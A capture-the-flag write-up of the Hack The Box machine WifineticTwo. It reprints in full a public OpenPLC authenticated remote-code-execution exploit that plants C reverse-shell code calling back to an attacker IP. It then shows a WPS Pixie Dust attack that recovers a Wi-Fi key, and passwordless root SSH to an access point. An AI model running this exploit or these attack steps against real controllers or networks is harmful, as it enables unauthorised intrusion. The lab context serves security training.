---
title:  "HTB WifineticTwo Writeup"
date:   2024-07-27 00:30:00 
categories: HTB Machine
tags: openplc openwrt wps pixiedust
---

![WifineticTwo](/assets/img/WifineticTwo/GIpZDbQW4AA_gyX.png)

## Introduction 

The initial access of this machine was quite trivial.It was made a little bit more difficutl because the creator didn't use the default program file but added a new one. This however is quite an easy change to make.

The privilege escalation lets you exploit a wifi access point using pixiedust attack. This will then give you access to an internal network which then can be leveraged to take over the access point as well.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A -p- -v -oN nmap 10.129.223.233
```
**Nmap**
```
# Nmap 7.94 scan initiated Wed Mar 20 14:35:25 2024 as: nmap -sS -A -p- -v -oN nmap 10.129.223.233
Nmap scan report for 10.129.223.233
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.129.223.233:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zfssfw.hnICuS5WCGpvDLUk5re2sb8K3A0; Expires=Wed, 20-Mar-2024 18:40:43 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 20 Mar 2024 18:35:43 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zfssfw.hAn9WXgtry9qcc1SUK59VEhI_Bs; Expires=Wed, 20-Mar-2024 18:40:43 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 20 Mar 2024 18:35:43 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zfssfw.hnICuS5WCGpvDLUk5re2sb8K3A0; Expires=Wed, 20-Mar-2024 18:40:43 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 20 Mar 2024 18:35:43 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94%I=7%D=3/20%Time=65FB2C7D%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/html;\
SF:x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\.0\
SF:.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZnJlc
SF:2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.Zfssfw\.hAn9WXgtry9qcc1SUK59VEhI
SF:_Bs;\x20Expires=Wed,\x2020-Mar-2024\x2018:40:43\x20GMT;\x20HttpOnly;\x2
SF:0Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20W
SF:ed,\x2020\x20Mar\x202024\x2018:35:43\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x2
SF:0PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Redire
SF:cting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be
SF:\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20href=\
SF:"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%r(H
SF:TTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html;\x
SF:20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Cooki
SF:e\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.Zfssfw\.hnICuS5
SF:WCGpvDLUk5re2sb8K3A0;\x20Expires=Wed,\x2020-Mar-2024\x2018:40:43\x20GMT
SF:;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkzeug
SF:/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Wed,\x2020\x20Mar\x202024\x2018
SF::35:43\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x20re
SF:quest\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncontent
SF:-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>400\
SF:x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20req
SF:uest\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404\x2
SF:0NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\nconten
SF:t-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcGVyb
SF:WFuZW50Ijp0cnVlfQ\.Zfssfw\.hnICuS5WCGpvDLUk5re2sb8K3A0;\x20Expires=Wed,
SF:\x2020-Mar-2024\x2018:40:43\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver:\x
SF:20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Wed,\x2020\x20Mar\x20
SF:2024\x2018:35:43\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C/
SF:/DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</title
SF:>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20f
SF:ound\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20
SF:manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\
SF:.</p>\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=3/20%OT=22%CT=1%CU=37102%PV=Y%DS=2%DC=T%G=Y%TM=65FB2C9
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11
OS:NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 27.378 days (since Thu Feb 22 04:32:00 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   76.07 ms 10.10.16.1
2   16.05 ms 10.129.223.233

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 20 14:36:03 2024 -- 1 IP address (1 host up) scanned in 38.84 seconds
```
When reviewing the Nmap output we can see that there is only SSH open and a web server on port **8080** When looking at this service we can see an **OpenPLC** login panel.

![OpenPLC login page](/assets/img/WifineticTwo/WifineticTwo_01.png)

When looking online i found out that the default credentials are **openplc** for both the username and password. When logging in with these credentials we would be greeted with the following dashboard.

![Logged in](/assets/img/WifineticTwo/WifineticTwo_02.png)


When searching for any exploits that i might be able to use on openplc i found the following exploit [OpenPLC 3 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49803). This exploit was valid however the default configuration did now work. In the script below i modified line 34:

**From** 
```python 
compile_program = options.url + '/compile-program?file=681871.st' 
```

**To** 
```bash
compile_program = options.url + '/compile-program?file=blank_program.st' 

```

We need to do this because the program this openplc instance is running isn't the default **681871.st** but instead the **blank_program.st**

**Full code**
```python
# Exploit Title: OpenPLC 3 - Remote Code Execution (Authenticated)
# Date: 25/04/2021
# Exploit Author: Fellipe Oliveira
# Vendor Homepage: https://www.openplcproject.com/
# Software Link: https://github.com/thiagoralves/OpenPLC_v3
# Version: OpenPLC v3
# Tested on: Ubuntu 16.04,Debian 9,Debian 10 Buster

#/usr/bin/python3

import requests
import sys
import time
import optparse
import re

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://target-uri:8080)")
parser.add_option('-l', '--user', action="store", dest="user", help="User credential to login")
parser.add_option('-p', '--passw', action="store", dest="passw", help="Pass credential to login")
parser.add_option('-i', '--rip', action="store", dest="rip", help="IP for Reverse Connection")
parser.add_option('-r', '--rport', action="store", dest="rport", help="Port for Reverse Connection")

options, args = parser.parse_args()
if not options.url:
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    print('[+] Specify an url target')
    print("[+] Example usage: exploit.py -u http://target-uri:8080 -l admin -p admin -i 192.168.1.54 -r 4444")
    exit()

host = options.url
login = options.url + '/login' 
upload_program = options.url + '/programs'
compile_program = options.url + '/compile-program?file=blank_program.st' 
run_plc_server = options.url + '/start_plc'
user = options.user
password = options.passw
rev_ip = options.rip
rev_port = options.rport
x = requests.Session()

def auth():
    print('[+] Remote Code Execution on OpenPLC_v3 WebServer')
    time.sleep(1)
    print('[+] Checking if host '+host+' is Up...')
    host_up = x.get(host)
    try:
        if host_up.status_code == 200:
            print('[+] Host Up! ...')
    except:
        print('[+] This host seems to be down :( ')
        sys.exit(0)

    print('[+] Trying to authenticate with credentials '+user+':'+password+'') 
    time.sleep(1)   
    submit = {
        'username': user,
        'password': password
    }
    x.post(login, data=submit)
    response = x.get(upload_program)
            
    if len(response.text) > 30000 and response.status_code == 200:
        print('[+] Login success!')
        time.sleep(1)
    else:
        print('[x] Login failed :(')
        sys.exit(0)  

def injection():
    print('[+] PLC program uploading... ')
    upload_url = host + "/upload-program" 
    upload_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvgPw.qwEcF3rMliGcTgQ4zI4RInBZrqE"}
    upload_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------210749863411176965311768214500", "Origin": host, "Connection": "close", "Referer": host + "/programs", "Upgrade-Insecure-Requests": "1"} 
    upload_data = "-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"file\"; filename=\"program.st\"\r\nContent-Type: application/vnd.sailingtracker.track\r\n\r\nPROGRAM prog0\n  VAR\n    var_in : BOOL;\n    var_out : BOOL;\n  END_VAR\n\n  var_out := var_in;\nEND_PROGRAM\n\n\nCONFIGURATION Config0\n\n  RESOURCE Res0 ON PLC\n    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);\n    PROGRAM Inst0 WITH Main : prog0;\n  END_RESOURCE\nEND_CONFIGURATION\n\r\n-----------------------------210749863411176965311768214500\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload Program\r\n-----------------------------210749863411176965311768214500--\r\n"
    upload = x.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)

    act_url = host + "/upload-program-action"
    act_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------374516738927889180582770224000", "Origin": host, "Connection": "close", "Referer": host + "/upload-program", "Upgrade-Insecure-Requests": "1"}
    act_data = "-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_name\"\r\n\r\nprogram.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_descr\"\r\n\r\n\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"prog_file\"\r\n\r\n681871.st\r\n-----------------------------374516738927889180582770224000\r\nContent-Disposition: form-data; name=\"epoch_time\"\r\n\r\n1617682656\r\n-----------------------------374516738927889180582770224000--\r\n"
    upload_act = x.post(act_url, headers=act_headers, data=act_data)
    time.sleep(2)

def connection():
    print('[+] Attempt to Code injection...')
    inject_url = host + "/hardware"
    inject_dash = host + "/dashboard"
    inject_cookies = {"session": ".eJw9z7FuwjAUheFXqTx3CE5YInVI5RQR6V4rlSPrekEFXIKJ0yiASi7i3Zt26HamT-e_i83n6M-tyC_j1T-LzXEv8rt42opcIEOCCtgFysiWKZgic-otkK2XLr53zhQTylpiOC2cKTPkYt7NDSMlJJtv4NcO1Zq1wQhMqbYk9YokMSWgDgnK6qRXVevsbPC-1bZqicsJw2F2YeksTWiqANwkNFsQXdSKUlB16gIskMsbhF9_9yIe8_fBj_Gj9_3lv-Z69uNfkvgafD90O_H4ARVeT-s.YGvyFA.2NQ7ZYcNZ74ci2miLkefHCai2Fk"}
    inject_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------289530314119386812901408558722", "Origin": host, "Connection": "close", "Referer": host + "/hardware", "Upgrade-Insecure-Requests": "1"}
    inject_data = "-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"hardware_layer\"\r\n\r\nblank_linux\r\n-----------------------------289530314119386812901408558722\r\nContent-Disposition: form-data; name=\"custom_layer_code\"\r\n\r\n#include \"ladder.h\"\r\n#include <stdio.h>\r\n#include <sys/socket.h>\r\n#include <sys/types.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nint ignored_bool_inputs[] = {-1};\r\nint ignored_bool_outputs[] = {-1};\r\nint ignored_int_inputs[] = {-1};\r\nint ignored_int_outputs[] = {-1};\r\n\r\n//-----------------------------------------------------------------------------\r\n\r\n//-----------------------------------------------------------------------------\r\nvoid initCustomLayer()\r\n{\r\n   \r\n    \r\n    \r\n}\r\n\r\n\r\nvoid updateCustomIn()\r\n{\r\n\r\n}\r\n\r\n\r\nvoid updateCustomOut()\r\n{\r\n    int port = "+rev_port+";\r\n    struct sockaddr_in revsockaddr;\r\n\r\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\r\n    revsockaddr.sin_family = AF_INET;       \r\n    revsockaddr.sin_port = htons(port);\r\n    revsockaddr.sin_addr.s_addr = inet_addr(\""+rev_ip+"\");\r\n\r\n    connect(sockt, (struct sockaddr *) &revsockaddr, \r\n    sizeof(revsockaddr));\r\n    dup2(sockt, 0);\r\n    dup2(sockt, 1);\r\n    dup2(sockt, 2);\r\n\r\n    char * const argv[] = {\"/bin/sh\", NULL};\r\n    execve(\"/bin/sh\", argv, NULL);\r\n\r\n    return 0;  \r\n    \r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n-----------------------------289530314119386812901408558722--\r\n"
    inject = x.post(inject_url, headers=inject_headers, cookies=inject_cookies, data=inject_data)
    time.sleep(3)
    comp = x.get(compile_program)
    time.sleep(6)
    x.get(inject_dash)
    time.sleep(3)
    print('[+] Spawning Reverse Shell...')
    start = x.get(run_plc_server)
    time.sleep(1)
    if start.status_code == 200:
        print('[+] Reverse connection receveid!') 
        sys.exit(0)
    else:
        print('[+] Failed to receive connection :(')
        sys.exit(0)

auth()
injection()
connection()
```

So now we run the exploit with the following parameters

```bash
python3 exploit.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.16.98 -r 443
```

Then after a few moments we'd get a connection back to our own machine as the root user on this container.

![Reverse shell](/assets/img/WifineticTwo/WifineticTwo_03.png)


## Lateral movement through Wifi

Seeing the name of the box i was already assuming that this box had something to do with wifi exploitation. My first step was to check if there was a wireless interface. With the following command i was able to confirm that there was indeed a wireless interface named **wlan0**

```bash
ifconfig
```

![Interface enum](/assets/img/WifineticTwo/WifineticTwo_04.png)

Because i was getting a little annoyed with the bad output i decided to run the following command to upgrade my shell to a fully interactive shell making my output a bit cleaner.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

So my next step was trying to get info about the wireless networks all around the machine. By running the following command I was able to discover that there was only one wireless network in range of this machine named **plcnetwork**.

```bash
iw dev wlan0 scan
```

![Interface enum](/assets/img/WifineticTwo/WifineticTwo_05.png)

So looking at this output we can see that this wireless network is using WPS version on. WPS protocol is notoriously badly secured and is vulnerable to a bunch of common vulnerabilities. The first that came to mind is to try a pixidust attack. If this attack is successfull its possible to obtain the preshared key of this wifi network. There are many different Tools that can do this but i decided to go for an implementation of the attack written in python. The exploit code can be found [here](https://github.com/kimocoder/OneShot).

Download the git repo onto our machine first.

```bash
git clone https://github.com/kimocoder/OneShot.git
```

next setup a local webserver so we can download this file onto our target machine


```bash
curl http://10.10.16.98/oneshot.py -o oneshot.py
python3 oneshot.py  -i wlan0 -b 02:00:00:00:01:00 
```

After running this exploit we could see that the preshared key was **NoWWEDoKnowWhaTisReal123!**

![Wifi password leaked](/assets/img/WifineticTwo/WifineticTwo_06.png)


So now that we have the wifi password we need to connect to this network. We can do this with wpa_supplicant. First we need to make a valid wpa_supplicant config file. With the following command I was able to create a valid wpa_supplicant config as well as use it to connect with it.



```bash
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config
wpa_supplicant -B -c config -i wlan0
```
Next we set an ip address in the range of the wifi network.

```bash
ifconfig wlan0 192.168.1.100 netmask 255.255.255.0
```

Now that we have connection we can do a pingsweep to find out what other hosts are present on the internal network.

```bash
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
```

When trying to connect to the ssh service on the default gateway of this network it was possible to log on without any password giving us access to the access point.

```bash
ssh root@192.168.1.1
```

![Root access](/assets/img/WifineticTwo/WifineticTwo_07.png)
